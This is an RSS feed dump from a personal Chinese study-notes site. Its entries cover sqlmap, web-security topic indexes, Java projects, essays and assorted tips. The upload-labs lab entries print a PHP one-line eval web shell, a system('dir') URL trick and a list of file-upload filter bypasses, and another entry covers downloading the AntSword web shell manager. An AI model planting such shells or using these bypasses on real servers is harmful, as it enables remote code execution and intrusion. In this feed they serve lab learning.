sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用四种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。
准备工作： (1) Python2.7.11；
https://www.python.org/
(2) SQLMap
https://sqlmap.org/
默认全选，下一步
更改安装路径即可
下载sqlmap：
下载完成，进行解压文件，推荐除C盘以外其他盘符</description></item><item><title>sql注入</title><link>https://ob.tianzhongs.ml/sql%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/sql%E6%B3%A8%E5%85%A5/</guid><description>基础 [[01.什么是SQL注入]] [[02.SQL注入之MYSQL语句语法]] [[03.SQL注入之MYSQL系统库]] [[mysql手工注入]] [[2.1.SQL注入之sqli-labs环境搭建]] [[2.2 SQL注入之MYSQL手工注入]] [[2.3 SQL注入之高权限注入上]] [[2.4 SQL注入之高权限注入下]] [[2.5 SQL注入之文件读写]] 3-数据类型与提交方式 [[3.</description></item><item><title>ssrf</title><link>https://ob.tianzhongs.ml/ssrf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/ssrf/</guid><description> [[01-什么是SSRF漏洞]] [[02-SSRF漏洞的防御]] [[03-如何发现SSRF漏洞]]</description></item><item><title>test</title><link>https://ob.tianzhongs.ml/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/test/</guid><description>1 table</description></item><item><title>upload-labs</title><link>https://ob.tianzhongs.ml/upload-labs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/upload-labs/</guid><description> [[upload-labs安装]] [[upload-labs闯关心得体会]] [[upload-labs通关]] [[upload-labs总结]]</description></item><item><title>upload-labs安装</title><link>https://ob.tianzhongs.ml/upload-labs%E5%AE%89%E8%A3%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/upload-labs%E5%AE%89%E8%A3%85/</guid><description> 集成环境版本 下载集成环境（win）：https://github.com/c0ny1/upload-labs/releases 集成环境可以直接使用，不用配置额外的东西，很方便 手动安装 自行安装源码：https://github.com/c0ny1/upload-labs 下载好之后，解压 phpstudy自带可以下载的php都是非线程安全（nts后缀）的，所以需要自己网上下载 配置好的Apache2.4+PHP7.4.22，将这个php解压的文件夹放到已经安装好的phpstudy对应的目录下，因为phpstudy默认自带可以下载的没有该版本与内容 内有使用说明 链接：https://pan.baidu.com/s/1eiEt2XseTZqigTZYrsgKtQ?pwd=8888 创建一个网站，选择这个目录，注意php选择刚才解压到phpstudy的php中的选项 {:height 589, :width 575} 把解压的upload-labs文件放到phpstudy的www中你创建网站的那个目录中 安装成功 注意：如果配置好了之后显示502错误，可以查看浏览器的代理工具是否关闭</description></item><item><title>upload-labs总结</title><link>https://ob.tianzhongs.ml/upload-labs%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/upload-labs%E6%80%BB%E7%BB%93/</guid><description>[[总结]]一下漏洞的原因 最基础的就是前端的校验，基本都是通过js来实现，禁用了就没有效果了 其次是通过后端的校验 http中post、get请求中携带的信息进行校验 比如content-type的MIME校验 文件名后缀的校验 等价扩展名绕过 .htaccess、.user.ini等配置文件进行绕过 .htaccess文件可以指定某些后缀或者某些特定文件，以何种方式去执行，比如将acc文件用php的方式去执行 .user.ini则会将其作为配置文件进行运行 字符相关 大小写绕过 空格绕过，一般都是windows的末尾空格 点号绕过，一般也是windows ::$DATA 后缀绕过一般还是windows服务器中 拼接绕过：上传文件名为 .</description></item><item><title>upload-labs通关</title><link>https://ob.tianzhongs.ml/upload-labs%E9%80%9A%E5%85%B3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/upload-labs%E9%80%9A%E5%85%B3/</guid><description>安装环境为集成版本：https://github.com/c0ny1/upload-labs/releases [[小技巧]]： 在url中带入参数访问： http://localhost/upload/1.jpg?1=system(%27dir%27); 需要一个shell.php一句话木马万文件
1 2 3 4 5 &amp;lt;?php header(&amp;#34;Content-type:text/html;charset=gb1232&amp;#34;); echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;; @eval($_POST[&amp;#39;a&amp;#39;]); ?&amp;gt; 注意 所使用的的是20关版本的那个集成环境，非后面的21关版本，所差的是空格绕过</description></item><item><title>upload-oabs鹅汤馆新</title><link>https://ob.tianzhongs.ml/upload-labs%E9%97%AF%E5%85%B3%E5%BF%83%E5%BE%97%E4%BD%93%E4%BC%9A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/upload-labs%E9%97%AF%E5%85%B3%E5%BF%83%E5%BE%97%E4%BD%93%E4%BC%9A/</guid><description> [[心得]] 有一些遗留问题，比如说是对于操作的不够熟练，不过大概是知晓了基本的原理了。</description></item><item><title>Vercel自定义域名</title><link>https://ob.tianzhongs.ml/Vercel%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Vercel%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/</guid><description>Vercel自定义域名 Created: September 5, 2022 5:20 PM
准备 域名 vercel已经部署好的网站 步骤 点击vercel中已经部署好的项目，点击set domain中添加已经购买的域名，简单域名和子域名都可以，举例：www.[zhangsan.ml](http://zhangsan.ml) zhangsan.ml 在购买的网站中设置域名解析 在购买的域名服务提供商中填写解析 域名解析填写</description></item><item><title>xss</title><link>https://ob.tianzhongs.ml/xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/xss/</guid><description> [[01-http协议常用的请求方式]] [[02-什么是cookie]] [[03-什么是session]] [[04-javaScript操作cookie]] [[05-脚本注入xss]] [[06-获取cookie发送到邮件]] [[07-xss的检测与利用]] [[08-xss防御方法]]</description></item><item><title>xxe</title><link>https://ob.tianzhongs.ml/xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/xxe/</guid><description> [[01-xml基础知识]] [[02-XXE漏洞]] [[03-XXE-Lab]] [[04-XXE防御方法]]</description></item><item><title>《人生第一次》观后感</title><link>https://ob.tianzhongs.ml/%E4%BA%BA%E7%94%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%82%E5%90%8E%E6%84%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%BA%BA%E7%94%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%82%E5%90%8E%E6%84%9F/</guid><description> [[观后感]] 主要讲述了出生、上学、成长、当兵、上班、结婚、进城、买房、相守、退休、养老、告别十二个场景，其中泛函了绝大多数人的一生，但是这些人绝大多数人都不是普通人，或者说，他们与我们普通人还有一定距离，与我们所处的阶级层级不同是，但是还是能够表达一些人生事态的。 在出生阶段，几乎每一个父母都拥有一些激动的情绪，对于一般的人来说，他们往往是兴奋与激动的，但是在另一个层面，对于一些心态或者说家庭等等环境因素的人来说，他们可能就显得不那么“高兴”了。 在上学的阶段中，几乎任何“高阶层等级”的人，他们都希望能够在自己能力范围之内，甚至范围之外，能够拥有一定的能力将孩子培养得更好，让他们获得更多的资源。 从后面的，在上学、成长、上班、结婚、进城、买房等等这些阶段中，剧中所表达的大多是对于人之常情的感受，但是从侧面看，你无一不能看到一些对于普通人来说的资源问题，诸如，你上学辛苦刻苦学习的时候，更多人只是苦读书，而有资源的“高端玩家”他们拥有规则或者制定规则的人际关系，他们能够获得更多的东西，你还在为孩子考了98分兴奋激动的时候，他们的孩子已经受到“哈佛”大学教授的指点，参加了国外的教育培训、参加了项目，制作和参与了研发，等等诸如此类，无一不在体验个人初始资源的对人的一生的重要性。 让我想到了一个东西，当一些高端玩家的儿子在获得成功的时候，在沾沾自喜的时候，在说出：“以上，全是我的辛苦努力，每一步我都踏踏实实的走路，所获得的成功都来源于我此阶段的辛勤付出”的时候，他们是否会考虑到能够给他们提供资源、提供思维、提供眼界的人，如果他们没有这些背景，如果他们没有如此不错的父母，如果…… 可他们都拥有了，他们能够获得的大多数都来自于他们的家族提供，事实上，即使他们不努力，他们的家族也会有意无意辅助他们获得更多，他们很容易签到一千万的大单，他们很容易拥有几百万的资金，但是普通人，可能还在还房贷。 那么问题来了，如此不同的人生，如果拥有选择的权利，考虑到精神内在的真实感受，你会考虑那种？ 一般来说，人生无非在于享受观念，一面是价值的享受，一面是身体的享受，两者相互渗透，但是对于不同的人的感受不同，不管是哪一种，对于我们的来说，都是非常乐于其中的。 人生第一次，且只有一次，看重的是什么？且还需细细斟酌。</description></item><item><title>《算法之美》读后感</title><link>https://ob.tianzhongs.ml/%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E%E8%AF%BB%E5%90%8E%E6%84%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E%E8%AF%BB%E5%90%8E%E6%84%9F/</guid><description>#《算法之美》 #读后感 [[观后感]] 生活中很多看似复杂的问题都可以用算法解决，与浑浑噩噩的接受命运的安排，不如有点儿理性决策的精神，把决策变成一个数学问题，在这个充满不确定的时代，给咱们自己增加一点底气。 个人体会 无论是哪一种的算法，对于生活中来说都是具有一定的优缺点的，这是因为我们不是神。
不必要去追求最优秀的算法，很多对于我们来说已经足够使用。之所以不去追求最好，因为当所有的东西都是最好的时候，其优劣性将变得不复存在，优劣性也将变得毫无意义。
生活应该学会停止思考，一昧的思考，只会给自己的大脑和心灵带来巨大的伤痛。
摘录 如果你了解了所有的事实，它们就不会有任何错误和不确定性，你可以直接评估什么对你来说是重要的，然后不要过早的停止。思考的时间长而努力：模型的复杂性和付出的努力都是值得的。
两性之间的情欲几乎不会随着时代的变迁而发生改变。在代数学上，我们可以称之为给定量。——托马斯
我的生命只有一次。因此，如果我能做点儿善事，或者可以向人们表示善意，让我现在就做吧！别让我拖延，别让我疏忽，因为我没有第二次生命！
用掉这个下午吧！你不可能把它带走。</description></item><item><title>【项目1】图书管理系统</title><link>https://ob.tianzhongs.ml/%E9%A1%B9%E7%9B%AE1%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%A1%B9%E7%9B%AE1%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</guid><description>【项目1】图书管理系统 1. 导包 导入图书管理的包到idea 选择src目录，设置为source root 设置编码为gbk，设置jdk为8或者以上 2. 初始化用户数据 具体步骤 将User实现Serializable，添加序列化号 添加util工具包，添加initdatautil，添加初始化数据的方法 写出initdata通用方法，以及在主函数main方法中，写入具体的持久化user对象的方法，将对象写入到本地硬盘中，具体代码如下 注意：存入本地的对象都需要添加序列号，常用的路径可以加入到常量类中，pathConstant中的user对象存放路径 主要代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package com.</description></item><item><title>【项目2】多线程下载器步骤</title><link>https://ob.tianzhongs.ml/%E9%A1%B9%E7%9B%AE2%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E6%AD%A5%E9%AA%A4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%A1%B9%E7%9B%AE2%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E6%AD%A5%E9%AA%A4/</guid><description>【项目2】多线程下载器步骤 main方法中写对下载链接进行基本的变量准备，以及输入变量 在工具类util中创建HTTP工具类，其中写下两个静态方法 getHttpURLConnection(String url)：用于获取HttpURLConnection的对象 getHttpFileName(String url) core类 不想写了，主要是对于多线程的使用 通过多线程划分（比如8个线程），将要下载的文件分成8份，异步下载到本地之后，存放在以序号排列的temp临时文件（后缀名可以自定义），然后最后通过每个临时文件的序号按照顺序进行重新写入到一个文件中。 需要注意的是下载的这个每个片段的起始值是在上一个end值上加1</description></item><item><title>【项目3】电影票购票系统</title><link>https://ob.tianzhongs.ml/%E9%A1%B9%E7%9B%AE3%E7%94%B5%E5%BD%B1%E7%A5%A8%E8%B4%AD%E7%A5%A8%E7%B3%BB%E7%BB%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E9%A1%B9%E7%9B%AE3%E7%94%B5%E5%BD%B1%E7%A5%A8%E8%B4%AD%E7%A5%A8%E7%B3%BB%E7%BB%9F/</guid><description>【项目3】电影票购票系统 知识点 集合的各种数据类型 查询 Lambda表达式 日志的使用 步骤 进行基本的配置 Logback的jar导入，放到项目的模块目录下，作为as library 配置xml文件，在src目录下 系统角色分析：bean层书写基本的角色类代码，注意各类之间的继承关系 首页设计：对首页的基本功能进行设计，主要包括了商家界面和客户界面 功能设计： 商家 影片库查看 影片上架 影片下架 修改影片信息 客户 查看所有的影片 根据电影名称购买电影票：需要筛选商家，因为不同商家可能都有这部电影 退票：通过用户购票记录进行查询</description></item><item><title>三步简单解决3306端口占用问题</title><link>https://ob.tianzhongs.ml/%E4%B8%89%E6%AD%A5%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B33306%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%B8%89%E6%AD%A5%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B33306%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98/</guid><description>[[注意]]：使用CMD时，以管理员模式进行，否则提示没有权限。
1 2 3 4 5 6 7 8 9 C:\Users\tianzhongs&amp;gt;netstat -ano|findstr 3306 #查看占用该端口的该进程号的pid TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 5928 TCP [::]:3306 [::]:0 LISTENING 5928 C:\Users\tianzhongs&amp;gt;tasklist |findstr 5928 #查看该进程 mysqld.</description></item><item><title>中国蚁剑</title><link>https://ob.tianzhongs.ml/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</guid><description> 下载主程序 文件名：antSword.zip 链接：https://pan.baidu.com/s/1wRmj_cB1sLkJ_npRCYO8Xw 提取码：8888 下载加载器 文件名：AntSword-Loader-v4.0.3-win32-x64
链接： https://pan.baidu.com/s/1TJBQ01JWLHUXLO-j2_GVfg 提取码：8888 解压压缩包，为主程序 AntSword.exe 创建快捷方式。 双击 AntSword.exe 启动主程序，第一次启动需要设置工作目录。 点击“初始化”，选择解压出来的主程序根目录。 用加载器去打开已经解压的主程序目录</description></item><item><title>临时邮箱</title><link>https://ob.tianzhongs.ml/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/</guid><description>Temp Mail - Disposable Temporary Email https://temp-mail.org/en/ Temp Mail - Disposable Temporary Email - Chrome 应用商店 https://chrome.google.com/webstore/detail/temp-mail-disposable-temp/inojafojbhdpnehkhhfjalgjjobnhomj eooc-mail https://github.com/lhl77/eooc-mail Eooc!</description></item><item><title>代理链接</title><link>https://ob.tianzhongs.ml/%E4%BB%A3%E7%90%86%E9%93%BE%E6%8E%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%BB%A3%E7%90%86%E9%93%BE%E6%8E%A5/</guid><description>代理链接 基本 v2rayng
1 https://openit.daycat.space/long clash
1 https://openit.daycat.space/clash 可查阅频道链接 TX链接可以去掉tx中的x试试
Name tx链接 tg链接 ✈️ 机场观测 • 白嫖无罪 https://tx.</description></item><item><title>你是我三十六度的风</title><link>https://ob.tianzhongs.ml/%E4%BD%A0%E6%98%AF%E6%88%91%E4%B8%89%E5%8D%81%E5%85%AD%E5%BA%A6%E7%9A%84%E9%A3%8E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%BD%A0%E6%98%AF%E6%88%91%E4%B8%89%E5%8D%81%E5%85%AD%E5%BA%A6%E7%9A%84%E9%A3%8E/</guid><description>“你是我三十九度的风 &amp;quot;
01 - 世间两种罪恶：你笑是一种，你不笑是另外一种。
——@mokilmq
02 - 夜阑卧听风吹雨，铁马是你，冰河也是你 君问归期未有期，巴山是你，夜雨也是你，月落乌啼霜满天。
江枫是你，渔火也是你，玲珑骰子安红豆，入骨是你，相思也是你 山有木兮木有枝，心悦是你，不知也是你。
——@弹得一手棉花
03 - 你是我最爱的一杯酒，喝完我就走。</description></item><item><title>使用Github action复制分支文件到同仓库的另一个分支</title><link>https://ob.tianzhongs.ml/%E4%BD%BF%E7%94%A8Github-action%E5%A4%8D%E5%88%B6%E5%88%86%E6%94%AF%E6%96%87%E4%BB%B6%E5%88%B0%E5%90%8C%E4%BB%93%E5%BA%93%E7%9A%84%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%BD%BF%E7%94%A8Github-action%E5%A4%8D%E5%88%B6%E5%88%86%E6%94%AF%E6%96%87%E4%BB%B6%E5%88%B0%E5%90%8C%E4%BB%93%E5%BA%93%E7%9A%84%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF/</guid><description>来源： https://github.com/marketplace/actions/file-sync 看第二个回答：  https://stackoverflow.com/questions/69577518/github-action-to-copy-specific-folders-from-one-branch-to-another-in-the-same-re 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 name: Copy folder to other branch on: [push] jobs: copy: name: Copy my folder runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - name: copy env: SRC_FOLDER_PATH: &amp;#39;static&amp;#39; TARGET_BRANCH: &amp;#39;dest&amp;#39; run: | files=$(find $SRC_FOLDER_PATH -type f) # get the file list git config --global user.</description></item><item><title>信封</title><link>https://ob.tianzhongs.ml/%E4%BF%A1%E5%B0%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%BF%A1%E5%B0%81/</guid><description>信封 你
要相信世界上一定会有一个你的爱人，
无论你此刻正被光芒环绕，
被掌声淹没，
还是那时你正孤独地走在寒冷的街道上被大雨淋湿，
无论是飘着小雪的微凉清晨，
还是被热浪炙烤的薄暮黄昏，
他一定会穿越这个世界上汹涌的人群，他一一地走过他们，怀着一颗用力跳动的心脏走向你。
他一定会捧着满腔的热和目光里沉甸甸的爱，走向你、抓紧你。
他会迫不及待地走到你的身边，
如果他年轻，
那他一定会像顽劣的孩童霸占着自己的玩具不肯与人分享般的拥抱你。
如果他已经不再年轻，
那他一定会像披荆斩棘归来的猎人，
在你身旁燃起篝火。
然后拥抱着你疲惫而放心地睡去。
他一定会找到你。你要等。</description></item><item><title>信息收集</title><link>https://ob.tianzhongs.ml/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description> [[01-域名信息收集]] [[02-ip信息收集]] [[03-端口服务信息收集]] [[04-CMS指纹识别]] [[05-CDN指纹识别]] [[06-WAF指纹识别]] [[07-搜索引擎收集信息]] [[08-网络空间搜索引擎]] [[09-目录扫描收集信息]] [[10-git信息收集]] [[11-信息收集总结]]</description></item><item><title>刷机常用</title><link>https://ob.tianzhongs.ml/%E5%88%B7%E6%9C%BA%E5%B8%B8%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%88%B7%E6%9C%BA%E5%B8%B8%E7%94%A8/</guid><description>基本 模式 fastboot模式：小米是开机长按音量下，用于线刷，包格式是tgz
recovery：卡刷，小米是开机长按音量上，rom包格式是zip（以下简称rec）
9008：没用过，貌似老机型插线
刷入recovery 注意：目前很多安卓都需要解锁bl才能刷机
进入fastboot模式，如果是命令，需要安装安卓官网的adb工具包，配置环境变量。 使用命令
1 fastboot flash recovery C:\Users\tianzhongs\Downloads\recovery.img 或者采用工具如秋之盒，一般刷机工具都内置了老版本的adb工具包。
卡刷 进入recovery模式</description></item><item><title>博客</title><link>https://ob.tianzhongs.ml/%E5%8D%9A%E5%AE%A2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%8D%9A%E5%AE%A2/</guid><description>一些不错的博客
Activities - xLog 博客平台</description></item><item><title>历史笔记库</title><link>https://ob.tianzhongs.ml/%E5%8E%86%E5%8F%B2%E7%AC%94%E8%AE%B0%E5%BA%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%8E%86%E5%8F%B2%E7%AC%94%E8%AE%B0%E5%BA%93/</guid><description>第一个 Notion 第二个：Obsidian ObZhishiku obtoknow 第三个：logseq duoji 第四个：Obsidian 多记 已上笔记打包存储在：https://www.</description></item><item><title>图片木马</title><link>https://ob.tianzhongs.ml/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/</guid><description/></item><item><title>墨者学院</title><link>https://ob.tianzhongs.ml/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/</guid><description>官网： 墨者学院_专注于网络安全人才培养 (mozhe.cn)
[[投票系统程序设计缺陷分析]]</description></item><item><title>多线程</title><link>https://ob.tianzhongs.ml/%E5%A4%9A%E7%BA%BF%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%A4%9A%E7%BA%BF%E7%A8%8B/</guid><description>多线程 多线程 Created: August 4, 2022 8:42 AM Date: August 4, 2022 类别: 多线程
书写注意点 方法一 继承 编写一个类，继承Thread（java.lang.Thread），重写run方法 启动线程：在main中new对象，然后使用线程的start()，开辟线程栈空间 方法二 实现 建议 采用这种方式，面向接口编程，更灵活，只能继承一个类，但是接口没有限制</description></item><item><title>如何写出令人心动的个人陈述</title><link>https://ob.tianzhongs.ml/%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E4%BB%A4%E4%BA%BA%E5%BF%83%E5%8A%A8%E7%9A%84%E4%B8%AA%E4%BA%BA%E9%99%88%E8%BF%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E4%BB%A4%E4%BA%BA%E5%BF%83%E5%8A%A8%E7%9A%84%E4%B8%AA%E4%BA%BA%E9%99%88%E8%BF%B0/</guid><description>如何写出令人心动的个人陈述 ![[../assets/Pasted image 20220827170501.png]] ![[../assets/Pasted image 20220827170534.png]] ![[../assets/Pasted image 20220827170545.png]] ![[../assets/Pasted image 20220827170549.png]] ![[../assets/Pasted image 20220827170553.png]] ![[../assets/Pasted image 20220827170557.png]] ![[../assets/Pasted image 20220827170600.</description></item><item><title>安卓相册</title><link>https://ob.tianzhongs.ml/%E5%AE%89%E5%8D%93%E7%9B%B8%E5%86%8C%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%AE%89%E5%8D%93%E7%9B%B8%E5%86%8C%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F/</guid><description>屏蔽安卓相册的文件名称：
1 .nomedia 文件夹里面有这个文件的，默认不会被扫描图片</description></item><item><title>实例：账户取钱</title><link>https://ob.tianzhongs.ml/054%E5%AE%9E%E4%BE%8B%E8%B4%A6%E6%88%B7%E5%8F%96%E9%92%B1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/054%E5%AE%9E%E4%BE%8B%E8%B4%A6%E6%88%B7%E5%8F%96%E9%92%B1/</guid><description>实例：账户取钱 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 package day15作业; /* 写一个名为Account的类模拟账户。 该类的属性和方法如下所示。 该类包括的属性：账户id，余额balance，年利率annualInterestRate； 包含的方法：各属性的set和get方法。取款方法withdraw()，存款方法deposit() 写一个测试程序 （1）创建一个Customer，名字叫Jane Smith，他有一个账号为1000，余额为2000，年利率为1.</description></item><item><title>将.git文件夹与仓库分开</title><link>https://ob.tianzhongs.ml/%E5%B0%86.git%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8E%E4%BB%93%E5%BA%93%E5%88%86%E5%BC%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%B0%86.git%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8E%E4%BB%93%E5%BA%93%E5%88%86%E5%BC%80/</guid><description>在仓库文件夹目录写的，添加.git文件
1 gitdir: C:/Users/tianzhongs/.logseq/git/Ccomma_Users_tianzhongs_Documents_多记/.git 然后将.git文件夹放在到指定的那个</description></item><item><title>将压缩包放进图片里</title><link>https://ob.tianzhongs.ml/%E5%B0%86%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%94%BE%E8%BF%9B%E5%9B%BE%E7%89%87%E9%87%8C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%B0%86%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%94%BE%E8%BF%9B%E5%9B%BE%E7%89%87%E9%87%8C/</guid><description>这是之前就弄过的，但是上课的时候突然想到，来重新记录补充一下 作用：将压缩包用图片jpg的方式隐藏起来
步骤 1、先找到一个压缩包，目前已知可行的是zip和rar格式的 2、打开cmd命令窗口：win+R 输入cmd，或者在当前的资源管理器地址栏输入cmd回车 3、输入命令：copy /b 需要藏的图片名和格式 + 需要藏的压缩文件名及格式 生成藏完文件的图片 copy /b 2.jpg +3.zip yq.jpg 就会将压缩包的内容放到图片中，生成一个新的图片文件。</description></item><item><title>开机自启以管理员运行bat文件</title><link>https://ob.tianzhongs.ml/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%90%E8%A1%8Cbat%E6%96%87%E4%BB%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%90%E8%A1%8Cbat%E6%96%87%E4%BB%B6/</guid><description>概要 原因：因为电脑外接键盘，但是笔记本自带的键盘通过各种方式都无法使其永久关闭，因此需要每次都自己手动关闭，所以希望能够在开机的时候执行某段bat命令，同时因为其命令特殊需要以管理员身份权限进行执行。
以管理员身份运行 如果要使bat文件使用管理员身份启动，一般有两种方法 在bat文件开机加入以下代码
1 %1 mshta vbscript:CreateObject(&amp;#34;Shell.Application&amp;#34;).ShellExecute(&amp;#34;cmd.exe&amp;#34;,&amp;#34;/c %~s0 ::&amp;#34;,&amp;#34;&amp;#34;,&amp;#34;runas&amp;#34;,1)(window.close)&amp;amp;&amp;amp;exit cd /d &amp;#34;%~dp0&amp;#34; 右击选择bat文件，发送到桌面，在快捷方式中，选择高级，勾选以管理员身份运行
